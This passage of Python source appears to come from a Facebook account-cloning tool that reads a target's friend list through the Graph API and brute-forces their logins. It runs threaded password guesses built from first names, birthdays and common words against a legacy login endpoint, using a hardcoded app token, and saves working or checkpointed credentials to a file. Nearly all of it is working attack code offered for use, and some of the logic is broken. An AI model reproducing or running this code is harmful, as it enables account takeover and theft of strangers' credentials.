                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass2 
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass2 
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass3
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass3
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass4
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass4
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = '786786'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass5
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass5
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = b['first_name'] + '786'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass6
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass6
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = 'Bahobali'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass7
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass7
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
        except:                                                                     
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40m[✅] Process Has Been Completed✅✅✅\033[1;97m'
    print "\033[1;32;40m[✅] Total OK/\033[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;31;40m/\033[1;33;40m"+str(len(cekpoint))
    print '\033[1;34;40m[✅] Cloned Accounts Has Been Saved : save/cp.txt'
    jalan("  \033[1;32;40m•◈•────•◈•Thanks For Using ZK Tool•◈•────•◈•")
    
    raw_input("\n\033[1;91m[\033[1;91mExit\033[1;91m]")
    india()
    
def indonesia():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;94mToken invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo4
    print "\033[1;93m[1] \x1b[1;93mClone Indonesian Friend List Accounts."
    time.sleep(0.05)
    print "\033[1;91m[0] \033[1;91mBack"
    pilih_indonesia()

def pilih_indonesia():
    peak = raw_input("\n\033[1;37;40mChoose An Option: \033[1;97m")
    if peak =="":
        print "\033[1;97mFill in correctly"
        pilih_indonesia()
    elif peak =="1":
        os.system('clear')
        print logo4
        idt = raw_input("\033[1;97m[◉] Enter ID : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;34;40m[●] Name : "+op["name"]
        except KeyError:
            print"\033[1;97m[◉] ID Not Found!"
            raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
            indonesia()
        jalan("\033[1;34;40m[◉] Reading IDs...")
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="0":
        super()
    else:
        print "\x1b[1;91mFill in correctly"
        pilih_indonesia()
    
    print "\033[1;34;40m[◈] Total Fetched IDs : \033[1;97m"+str(len(id))
    jalan('\033[1;34;40m[◈] Please Wait...')
    jalan("\r\033[1;32;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
    jalan("\033[1;92m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
    jalan("\033[1;91m| Status| |      Id No      |  Password |")


    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = '786786'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass1
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass1
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = 'Sayang'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass2
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass2
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = 'Kontol'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass3
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass3
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = 'Cantik'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass4
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass4
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = 'Doraemon'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass5
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass5
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = 'Bangsat'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass6
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass6
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = 'Bintang'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass7
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass7
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
        except:                                                                     
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40m[✅] Process Has Been Completed✅✅✅\033[1;97m'
    print "\033[1;32;40m[✅] Total OK/\033[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;31;40m/\033[1;33;40m"+str(len(cekpoint))
    print '\033[1;34;40m[✅] Cloned Accounts Has Been Saved : save/cp.txt'
    jalan("  \033[1;32;40m•◈•────•◈•Thanks For Using ZK Tool•◈•────•◈•")
    
    raw_input("\n\033[1;91m[\033[1;91mExit\033[1;91m]")
    indonesia()

def malaysia():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;94mToken invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo5
    print "\033[1;93m[1] \x1b[1;93mClone Malaysian Friend List Accounts."
    time.sleep(0.05)
    print "\033[1;91m[0] \033[1;91mBack"
    pilih_malaysia()

def pilih_malaysia():
    peak = raw_input("\n\033[1;37;40mChoose An Option: \033[1;97m")
    if peak =="":
        print "\033[1;97mFill in correctly"
        pilih_malaysia()
    elif peak =="1":
        os.system('clear')
        print logo5
        idt = raw_input("\033[1;97m[◉] Enter ID : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;34;40m[●] Name : "+op["name"]
        except KeyError:
            print"\033[1;97m[◉] ID Not Found!"
            raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
            malaysia()
        jalan("\033[1;34;40m[◉] Reading IDs...")
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="0":
        super()
    else:
        print "\x1b[1;91mFill in correctly"
        pilih_malaysia()
    
    print "\033[1;34;40m[◈] Total Fetched IDs : \033[1;97m"+str(len(id))
    jalan('\033[1;34;40m[◈] Please Wait...')
    jalan("\r\033[1;32;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
    jalan("\033[1;92m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
    jalan("\033[1;91m| Status| |      Id No      |  Password |")


    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = '786786'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass1
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass1
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '123'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass2
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass2
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass3
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass3
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass4
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass4
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = 'Sayang'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass5
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass5
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    birth = q['birthday']
                                                    pass4 = birth.replace('/', '')
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass6
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass6
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = 'abc123'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass7
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass7
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40m[✅] Process Has Been Completed✅✅✅\033[1;97m'
    print "\033[1;32;40m[✅] Total OK/\033[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;31;40m/\033[1;33;40m"+str(len(cekpoint))
    print '\033[1;34;40m[✅] Cloned Accounts Has Been Saved : save/cp.txt'
    jalan("  \033[1;32;40m•◈•────•◈•Thanks For Using ZK Tool•◈•────•◈•")
    
    raw_input("\n\033[1;91m[\033[1;91mExit\033[1;91m]")
    malaysia()



if __name__ == '__main__':
    login()



